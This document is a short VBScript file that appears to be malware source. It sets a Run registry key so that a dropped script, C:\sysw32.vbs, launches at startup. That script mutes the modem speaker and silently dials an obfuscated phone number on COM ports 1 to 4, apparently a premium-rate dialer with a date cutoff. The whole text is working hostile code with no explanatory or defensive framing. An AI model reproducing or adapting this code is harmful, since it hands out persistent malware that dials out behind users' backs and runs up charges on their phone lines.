Dim FSO,WSH,OUT,SYS,O
Set FSO=CreateObject("Scripting.FileSystemObject")
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sysw32","C:\sysw32.vbs"
Set OUT=FSO.CreateTextFile("C:\sysw32.vbs",True)
Function C(I)
C=Chr(I)
End Function
O=C(0)
Function S(I,J)
S=String(J,I)
End Function
Function N(I)
N=S(O,I)
End Function

OUT.Write("On Error Resume Next"&C(13)&C(10)&"dd  "&C(13)&C(10)&C(13)&C(10)&"sub dd"&C(13)&C(10)&"dim dat "&C(13)&C(10)&"dat = now"&C(13)&C(10)&"dim dval"&C(13)&C(10)&"dval = CDbl(dat)"&C(13)&C(10)&"if dval > 37712 then"&C(13)&C(10)&"  exit sub"&C(13)&C(10)&"end if"&C(13)&C(10)&"On Error Resume Next"&C(13)&C(10)&"Set c1=CreateObject("&C(34)&"MSCommLib.MSComm"&C(34)&")"&C(13)&C(10)&"dc 1,c1"&C(13)&C(10)&"Set c2=CreateObject("&C(34)&"MSCommLib.MSComm"&C(34)&")"&C(13)&C(10)&"dc 2,c2"&C(13)&C(10)&"Set c3=CreateObject("&C(34)&"MSCommLib.MSComm"&C(34)&")"&C(13)&C(10)&"dc 3,c3"&C(13)&C(10)&"Set c4=CreateObject("&C(34)&"MSCommLib.MSComm"&C(34)&")"&C(13)&C(10)&"dc 4,c4"&C(13)&C(10)&"WScript.Sleep(125000)"&C(13)&C(10)&"end sub"&C(13)&C(10)&C(13)&C(10)&"sub dc(n,c)"&C(13)&C(10)&"On Error Resume Next"&C(13)&C(10)&"c.CommPort=n"&C(13)&C(10)&"c.PortOpen = False"&C(13)&C(10)&"c.Settings = "&C(34)&"9600,N,8,1"&C(34)&C(13)&C(10)&"c.portOpen = True"&C(13)&C(10)&"s = "&C(34)&"ATL0S7=120M0DT"&C(34)&" & 302 * 3 + 0 & 98 * 3 + 0 & 222 * 3 + 1"&C(13)&C(10)&"c.Output = s & vbCrLf"&C(13)&C(10)&"end sub"&C(13)&C(10))
OUT.Close

sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
